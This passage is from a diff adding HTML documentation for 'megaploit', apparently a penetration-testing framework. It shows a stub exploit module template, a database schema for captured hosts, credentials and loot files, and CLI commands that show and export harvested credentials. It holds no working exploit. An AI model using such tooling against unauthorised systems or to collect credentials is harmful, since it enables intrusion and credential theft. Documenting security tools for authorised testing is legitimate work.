+</span><span id="__span-12-4"><a id="__codelineno-12-4" name="__codelineno-12-4" href="#__codelineno-12-4"></a><span class="k">class</span><span class="w"> </span><span class="nc">MyExploit</span><span class="p">(</span><span class="n">Module</span><span class="p">):</span>
+</span><span id="__span-12-5"><a id="__codelineno-12-5" name="__codelineno-12-5" href="#__codelineno-12-5"></a>    <span class="n">name</span> <span class="o">=</span> <span class="s2">&quot;exploits/linux/http/my_exploit&quot;</span>   <span class="c1"># ← catalogue path</span>
+</span><span id="__span-12-6"><a id="__codelineno-12-6" name="__codelineno-12-6" href="#__codelineno-12-6"></a>    <span class="o">...</span>
+</span><span id="__span-12-7"><a id="__codelineno-12-7" name="__codelineno-12-7" href="#__codelineno-12-7"></a>
+</span><span id="__span-12-8"><a id="__codelineno-12-8" name="__codelineno-12-8" href="#__codelineno-12-8"></a><span class="n">MODULE</span> <span class="o">=</span> <span class="n">MyExploit</span>   <span class="c1"># ← required</span>
+</span></code></pre></div>
+<p>After adding a new file, the registry auto-discovers it on next <code>show modules</code> or reload.</p>
+<hr />
+<h2 id="database-schema">Database Schema<a class="headerlink" href="#database-schema" title="Permanent link">&para;</a></h2>
+<p>SQLite database at <code>loot/megaploit.db</code>:</p>
+<div class="language-sql highlight"><pre><span></span><code><span id="__span-13-1"><a id="__codelineno-13-1" name="__codelineno-13-1" href="#__codelineno-13-1"></a><span class="n">hosts</span><span class="w"> </span><span class="p">(</span><span class="n">id</span><span class="p">,</span><span class="w"> </span><span class="n">ip</span><span class="p">,</span><span class="w"> </span><span class="n">hostname</span><span class="p">,</span><span class="w"> </span><span class="n">os</span><span class="p">,</span><span class="w"> </span><span class="n">notes</span><span class="p">,</span><span class="w"> </span><span class="n">first_seen</span><span class="p">,</span><span class="w"> </span><span class="n">last_seen</span><span class="p">)</span>
+</span><span id="__span-13-2"><a id="__codelineno-13-2" name="__codelineno-13-2" href="#__codelineno-13-2"></a><span class="n">services</span><span class="w"> </span><span class="p">(</span><span class="n">id</span><span class="p">,</span><span class="w"> </span><span class="n">host_id</span><span class="p">,</span><span class="w"> </span><span class="n">port</span><span class="p">,</span><span class="w"> </span><span class="n">proto</span><span class="p">,</span><span class="w"> </span><span class="n">name</span><span class="p">,</span><span class="w"> </span><span class="n">banner</span><span class="p">,</span><span class="w"> </span><span class="k">version</span><span class="p">)</span>
+</span><span id="__span-13-3"><a id="__codelineno-13-3" name="__codelineno-13-3" href="#__codelineno-13-3"></a><span class="n">credentials</span><span class="w"> </span><span class="p">(</span><span class="n">id</span><span class="p">,</span><span class="w"> </span><span class="n">host_id</span><span class="p">,</span><span class="w"> </span><span class="n">username</span><span class="p">,</span><span class="w"> </span><span class="n">password</span><span class="p">,</span><span class="w"> </span><span class="n">hash_type</span><span class="p">,</span><span class="w"> </span><span class="k">source</span><span class="p">,</span><span class="w"> </span><span class="n">captured_at</span><span class="p">)</span>
+</span><span id="__span-13-4"><a id="__codelineno-13-4" name="__codelineno-13-4" href="#__codelineno-13-4"></a><span class="n">loot_files</span><span class="w"> </span><span class="p">(</span><span class="n">id</span><span class="p">,</span><span class="w"> </span><span class="n">host_id</span><span class="p">,</span><span class="w"> </span><span class="n">path</span><span class="p">,</span><span class="w"> </span><span class="n">local_path</span><span class="p">,</span><span class="w"> </span><span class="n">file_type</span><span class="p">,</span><span class="w"> </span><span class="n">captured_at</span><span class="p">)</span>
+</span><span id="__span-13-5"><a id="__codelineno-13-5" name="__codelineno-13-5" href="#__codelineno-13-5"></a><span class="n">notes</span><span class="w"> </span><span class="p">(</span><span class="n">id</span><span class="p">,</span><span class="w"> </span><span class="n">host_id</span><span class="p">,</span><span class="w"> </span><span class="n">title</span><span class="p">,</span><span class="w"> </span><span class="n">content</span><span class="p">,</span><span class="w"> </span><span class="n">created_at</span><span class="p">)</span>
+</span><span id="__span-13-6"><a id="__codelineno-13-6" name="__codelineno-13-6" href="#__codelineno-13-6"></a><span class="n">jobs</span><span class="w"> </span><span class="p">(</span><span class="n">id</span><span class="p">,</span><span class="w"> </span><span class="n">name</span><span class="p">,</span><span class="w"> </span><span class="n">status</span><span class="p">,</span><span class="w"> </span><span class="n">started_at</span><span class="p">,</span><span class="w"> </span><span class="n">completed_at</span><span class="p">,</span><span class="w"> </span><span class="k">output</span><span class="p">)</span>
+</span></code></pre></div>
+<p>Access via CLI:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-14-1"><a id="__codelineno-14-1" name="__codelineno-14-1" href="#__codelineno-14-1"></a>megaploit [0] » creds show
+</span><span id="__span-14-2"><a id="__codelineno-14-2" name="__codelineno-14-2" href="#__codelineno-14-2"></a>megaploit [0] » creds search admin
+</span><span id="__span-14-3"><a id="__codelineno-14-3" name="__codelineno-14-3" href="#__codelineno-14-3"></a>megaploit [0] » creds export creds.json
+</span><span id="__span-14-4"><a id="__codelineno-14-4" name="__codelineno-14-4" href="#__codelineno-14-4"></a>megaploit [0] » loot browse
+</span></code></pre></div>
 
 
 
